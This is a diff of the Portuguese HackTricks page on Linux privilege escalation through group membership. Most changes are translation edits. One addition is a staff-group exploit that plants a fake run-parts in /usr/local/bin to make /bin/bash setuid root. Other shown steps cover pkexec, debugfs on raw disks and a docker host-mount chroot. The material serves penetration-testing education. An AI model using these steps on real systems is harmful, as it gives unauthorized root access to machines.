@@ -6,11 +6,11 @@
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -18,7 +18,7 @@ Outras maneiras de apoiar o HackTricks:
 
 ### **PE - Método 1**
 
-**Às vezes**, **por padrão (ou porque algum software precisa)** dentro do arquivo **/etc/sudoers** você pode encontrar algumas dessas linhas:
+**Às vezes**, **por padrão (ou porque algum software precisa)** dentro do arquivo **/etc/sudoers**, você pode encontrar algumas dessas linhas:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -28,7 +28,7 @@ Outras maneiras de apoiar o HackTricks:
 ```
 Isso significa que **qualquer usuário que pertença ao grupo sudo ou admin pode executar qualquer coisa como sudo**.
 
-Se for o caso, para **se tornar root você pode simplesmente executar**:
+Se for o caso, para **se tornar root, você pode simplesmente executar**:
 ```
 sudo su
 ```
@@ -43,7 +43,7 @@ Isso ocorre porque normalmente esses são os grupos dentro da **política polkit
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Aqui você encontrará quais grupos têm permissão para executar **pkexec** e **por padrão** em algumas distribuições linux os grupos **sudo** e **admin** aparecem.
+Aqui você encontrará quais grupos têm permissão para executar **pkexec** e **por padrão** em algumas distribuições Linux os grupos **sudo** e **admin** aparecem.
 
 Para **se tornar root você pode executar**:
 ```bash
@@ -57,7 +57,7 @@ Error executing command as another user: Not authorized
 ```
 **Não é porque você não tem permissões, mas sim porque você não está conectado sem uma GUI**. E há uma solução alternativa para esse problema aqui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Você precisa de **2 sessões ssh diferentes**:
 
-{% code title="session1" %}
+{% code title="sessão1" %}
 ```bash
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -70,6 +70,8 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
+{% endcode %}
+
 ## Grupo Wheel
 
 **Às vezes**, **por padrão** dentro do arquivo **/etc/sudoers** você pode encontrar esta linha:
@@ -78,7 +80,7 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 Isso significa que **qualquer usuário que pertença ao grupo wheel pode executar qualquer coisa como sudo**.
 
-Se for o caso, para **se tornar root, você pode simplesmente executar**:
+Se este for o caso, para **se tornar root você pode simplesmente executar**:
 ```
 sudo su
 ```
@@ -88,11 +90,63 @@ Usuários do **grupo shadow** podem **ler** o arquivo **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-Então, leia o arquivo e tente **quebrar alguns hashes**.
+## Grupo de Funcionários
 
+**staff**: Permite aos usuários adicionar modificações locais ao sistema (`/usr/local`) sem precisar de privilégios de root (observe que os executáveis em `/usr/local/bin` estão no PATH de qualquer usuário e podem "substituir" os executáveis em `/bin` e `/usr/bin` com o mesmo nome). Compare com o grupo "adm", que está mais relacionado à monitorização/segurança. [\[fonte\]](https://wiki.debian.org/SystemGroups)
+
+Nas distribuições debian, a variável `$PATH` mostra que `/usr/local/` será executado com a mais alta prioridade, quer seja um usuário privilegiado ou não.
+```bash
+$ echo $PATH
+/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+# echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+Se conseguirmos sequestrar alguns programas em `/usr/local`, podemos facilmente obter acesso de root.
+
+Sequestrar o programa `run-parts` é uma maneira fácil de obter acesso de root, pois a maioria dos programas executará um `run-parts` (como crontab, quando o login ssh).
+```bash
+$ cat /etc/crontab | grep run-parts
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+```
+ou Quando uma nova sessão ssh é iniciada.
+```bash
+$ pspy64
+2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
+2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
+2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
+2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
+2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
+2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
+2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
+```
+**Explorar**
+```bash
+# 0x1 Add a run-parts script in /usr/local/bin/
+$ vi /usr/local/bin/run-parts
+#! /bin/bash
+chmod 4777 /bin/bash
+
+# 0x2 Don't forget to add a execute permission
+$ chmod +x /usr/local/bin/run-parts
+
+# 0x3 start a new ssh sesstion to trigger the run-parts program
+
+# 0x4 check premission for `u+s`
+$ ls -la /bin/bash
+-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash
+
+# 0x5 root it
+$ /bin/bash -p
+```
 ## Grupo de Disco
 
-Este privilégio é quase **equivalente ao acesso root** pois você pode acessar todos os dados dentro da máquina.
+Este privilégio é quase **equivalente ao acesso root** pois permite acessar todos os dados dentro da máquina.
 
 Arquivos: `/dev/sd[a-z][1-9]`
 ```bash
@@ -108,11 +162,11 @@ Note que usando o debugfs você também pode **escrever arquivos**. Por exemplo,
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-No entanto, se você tentar **escrever arquivos de propriedade do root** (como `/etc/shadow` ou `/etc/passwd`) você receberá um erro de "**Permissão negada**".
+No entanto, se você tentar **escrever arquivos de propriedade do root** (como `/etc/shadow` ou `/etc/passwd`) você terá um erro de "**Permissão negada**".
 
 ## Grupo de Vídeo
 
-Usando o comando `w` você pode encontrar **quem está logado no sistema** e ele mostrará uma saída como a seguinte:
+Usando o comando `w` você pode encontrar **quem está conectado no sistema** e ele mostrará uma saída como a seguinte:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
@@ -129,7 +183,7 @@ Para **abrir** a **imagem bruta**, você pode usar o **GIMP**, selecionar o arqu
 
 ![](<../../../.gitbook/assets/image (287) (1).png>)
 
-Em seguida, modifique a Largura e Altura para as usadas na tela e verifique os diferentes Tipos de Imagem (e selecione aquele que mostra melhor a tela):
+Em seguida, modifique a Largura e Altura para as usadas na tela e verifique diferentes Tipos de Imagem (e selecione aquele que mostra melhor a tela):
 
 ![](<../../../.gitbook/assets/image (288).png>)
 
@@ -157,10 +211,8 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chr
 ```
 ## Grupo lxc/lxd
 
-Geralmente, **membros** do grupo **`adm`** têm permissão para **ler arquivos de log** localizados dentro de _/var/log/_.\
-Portanto, se você comprometeu um usuário dentro deste grupo, definitivamente deve **dar uma olhada nos logs**.
+Geralmente, **membros** do grupo **`adm`** têm permissão para **ler arquivos de log** localizados em _/var/log/_. Portanto, se você comprometeu um usuário dentro deste grupo, definitivamente deve **dar uma olhada nos logs**.
 
 ## Grupo Auth
 
-Dentro do OpenBSD, o grupo **auth** geralmente pode escrever nas pastas _**/etc/skey**_ e _**/var/db/yubikey**_ se forem usadas.\
-Essas permissões podem ser abusadas com o seguinte exploit para **escalar privilégios** para root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Dentro do OpenBSD, o grupo **auth** geralmente pode escrever nas pastas _**/etc/skey**_ e _**/var/db/yubikey**_ se forem usadas. Essas permissões podem ser abusadas com o seguinte exploit para **escalar privilégios** para root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
